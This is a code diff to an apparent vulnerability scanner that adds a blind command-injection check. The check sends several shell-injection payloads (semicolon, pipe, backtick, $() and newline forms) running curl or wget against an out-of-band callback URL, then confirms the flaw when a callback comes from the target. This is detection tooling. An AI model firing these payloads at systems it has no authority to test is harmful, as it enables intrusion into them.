@@ -393,6 +393,45 @@ def verify_error_sqli(candidate: Candidate, transport: Transport) -> Verdict:
                    f"a single quote broke a SQL string context ({sig!r}); the injected input is echoed in the database error")
 
 
+# --- blind command injection (out-of-band callback) -------------------------------------------
+def verify_blind_cmd_injection(candidate: Candidate, transport: Transport) -> Verdict:
+    """Oracle: command injection with NO reflected output — the injected shell fetches grin's OOB
+    collaborator. Reuses the SSRF precision model: CONFIRMED only on a callback from a source that
+    is NOT grin's own (the target's shell made it). Unhealthy collaborator -> INCONCLUSIVE. The
+    payload only fetches a URL (benign). Complements the in-band arithmetic oracle for blind sinks."""
+    import time
+    loc, o = candidate.location, candidate.oracle
+    oob = o.get("oob")
+    if oob is None or not oob.healthy():
+        return Verdict(INCONCLUSIVE, "command-injection", loc, "OOB collaborator unavailable / unreachable")
+    token = oob.mint_token()
+    cb = oob.callback_url(token)
+    field = candidate.inject_field or "cmd"
+    agent = transport.by_role.get("attacker") or (
+        lambda u, method="GET", json=None: transport.request(method, u, json=json))
+
+    def send(value):
+        if candidate.method.upper() == "POST":
+            return agent(candidate.url, method="POST", json={field: value})
+        return agent(_with_param(candidate.url, field, value))
+
+    for value in (f"127.0.0.1; curl -s {cb} #", f"127.0.0.1; wget -q -O- {cb} #",
+                  f"$(curl -s {cb})", f"`wget -q -O- {cb}`", f"127.0.0.1| curl -s {cb} #",
+                  f"127.0.0.1\ncurl -s {cb}"):
+        try:
+            send(value)
+        except Exception:
+            continue
+    deadline = time.time() + float(o.get("ssrf_timeout", 5))
+    while time.time() < deadline:
+        external = oob.hit_sources(token) - oob.grin_ips()
+        if external:
+            return Verdict(CONFIRMED, "command-injection", loc,
+                           f"blind command injection: the target's shell fetched the OOB collaborator (source {sorted(external)})")
+        time.sleep(0.25)
+    return Verdict(REJECTED, "command-injection", loc, "no out-of-band callback from an injected shell command")
+
+
 # --- path traversal / local file read (/etc/passwd disclosure) --------------------------------
 # Boundary is "start or any non-word char" so a passwd line survives an HTML wrapper (<pre>root:...)
 # as well as a bare newline, without matching 'myroot:' (a word char before 'root').
@@ -879,6 +918,7 @@ _REGISTRY: dict = {
     "reflected-xss": verify_reflected_xss,
     "ssrf": verify_ssrf,
     "command-injection": verify_cmd_injection,
+    "blind-command-injection": verify_blind_cmd_injection,
     "path-traversal": verify_path_traversal,
 }
 
